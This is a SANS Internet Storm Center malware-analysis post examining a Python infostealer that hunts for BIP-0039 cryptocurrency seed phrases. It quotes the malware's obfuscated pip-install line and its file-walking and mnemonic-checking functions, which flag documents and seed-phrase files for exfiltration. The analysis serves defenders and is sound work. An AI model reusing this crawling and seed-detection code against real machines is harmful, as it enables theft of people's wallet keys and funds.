---
title: An Infostealer Searching for &#xc2;&#xab; BIP-0039 &#xc2;&#xbb; Data, (Fri, Nov 22nd)
url: https://isc.sans.edu/diary/rss/31464
source: SANS Internet Storm Center, InfoCON: green
date: 2024-11-23
fetch_date: 2025-10-06T19:20:37.672414
---

# An Infostealer Searching for &#xc2;&#xab; BIP-0039 &#xc2;&#xbb; Data, (Fri, Nov 22nd)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31460)
* [next](/diary/31466)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [An Infostealer Searching for ��BIP-0039�� Data](/forums/diary/An%2BInfostealer%2BSearching%2Bfor%2BBIP0039%2BData/31464/)

**Published**: 2024-11-22. **Last Updated**: 2024-11-22 03:58:03 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/An%2BInfostealer%2BSearching%2Bfor%2BBIP0039%2BData/31464/#comments)

I like obfuscation techniques implemented by malware developers. If their primary purpose is to defeat security controls and automatic scanners, they are a great starting point for malware analysts. Indeed, if some data or actions have been obfuscated, that means that they can disclose interesting TTP’s. When reviewing a malicious Python script, I found this piece of code:

```

_M='-m';_P='pip';_L='install'
subprocess.check_call([sys.executable,_M,_P,_L,'mnemonic']);from mnemonic import Mnemonic
```

The script is trying to install the mnemonic Python module[[1](https://pypi.org/project/mnemonic/)]. I had never heard of this one before. The documentation says:

« Reference implementation of BIP-0039: Mnemonic code for generating deterministic keys »

BIP means « Bitcoin Improvement Proposal ». The proposal 39[[2](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki%0A%0A)] is related to a standard used in cryptocurrency wallets to make it easier and safer to store and recover your private keys. Instead of showing you a complicated private key (a long string of random letters and numbers), BIP-0039 converts it into a set of easy-to-remember words, like “apple,” “banana,” “cherry,” etc. This is called a mnemonic phrase or seed phrase.

Example:

>>> import mnemonic
>>> from mnemonic import Mnemonic
>>> m = Mnemonic("english")
>>> m.generate()
'program federal filter notable taxi kit range hobby unhappy raven power olympic'

It's like many password managers that allow to create « memorable » passwords. The human brain can easily remember simple words instead of complex strings.

Now, you can understand why this Python script is using this module. Besides the classic searches across files, it also searches for mnemonic phrases. Here is the piece of code performing this task:

```

def fenv():
    try:
        if os_type == "Windows":
            available_drives = get_available_drives()
            for drive in available_drives:
                for root, dirs, files in os.walk(drive+'\\', topdown=False):
                    for name in files:
                        if is_pat(name):
                            if is_exceptFile(name) == False:
                                if is_exceptPath(root) == False:
                                    if str(name).lower().endswith(('.xls','.xlsx','.doc','.docx','.rtf','.json')):
                                        ups(os.path.join(root, name))
                                    else:
                                        try:
                                            content = open(os.path.join(root, name), 'r', encoding='utf-8', errors='ignore').read()
                                            if ismnemonic(content):
                                                ups(os.path.join(root, name))
                                            if in_pk(str(content)):
                                                ups(os.path.join(root, name))
                                        except:
                                            pass
            ups(os.path.join(os.path.expanduser("~"), ".n2/flist"))
        else:
            for root, dirs, files in os.walk(os.path.expanduser("~"), topdown=False):
                for name in files:
                    if is_pat(name):
                        if is_exceptFile(name) == False:
                            if is_exceptPath(root) == False:
                                if str(name).lower().endswith(('.xls','.xlsx','.doc','.docx','.rtf','.json')):
                                    ups(os.path.join(root, name))
                                else:
                                    try:
                                        content = open(os.path.join(root, name), 'r', encoding='utf-8', errors='ignore').read()
                                        if ismnemonic(content):
                                            ups(os.path.join(root, name))
                                        if in_pk(str(content)):
                                            ups(os.path.join(root, name))
                                    except:
                                        pass
            ups(os.path.join(os.path.expanduser("~"), ".n2/flist"))
    except: pass
```

The ismnemonic() function is pretty simple. The content is the file is split per lines, lines are split per words and if we have 12, 16 or 24 words (required by BIP-0039), we check if it’s a mnemonic phrase:

```

def ismnemonic(st):
   try:
      st = st.split('\n')
      for txt in st:
         word_cnt = len(txt.split(" "))
         if word_cnt == 12 or word_cnt == 16 or word_cnt == 24:
               mnemo = Mnemonic("english")
               isValid = mnemo.check(txt)
               return isValid
         else:
               return False
   except:
      pass
```

It a mnemonic phrase is discovered, the file will be exfiltrated. Note that only English speakers are targeted.

The script has a score of 10/64 according to VT (SHA256: 737c6c397d182f27f692e2934d2a1235011a41c09e5f8640d21a8fee0c48c632)[[3](https://www.virustotal.com/gui/file/737c6c397d182f27f692e2934d2a1235011a41c09e5f8640d21a8fee0c48c632/detection)].

[1] <https://pypi.org/project/mnemonic/>
[2] <https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki>
[3] <https://www.virustotal.com/gui/file/737c6c397d182f27f692e2934d2a1235011a41c09e5f8640d21a8fee0c48c632/detection>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Python](/tag.html?tag=Python) [Malware](/tag.html?tag=Malware) [BIP](/tag.html?tag=BIP) [Infostealer](/tag.html?tag=Infostealer) [Mnemonic](/tag.html?tag=Mnemonic) [Phrase](/tag.html?tag=Phrase)

[0 comment(s)](/diary/An%2BInfostealer%2BSearching%2Bfor%2BBIP0039%2BData/31464/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31460)
* [next](/diary/31466)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honey...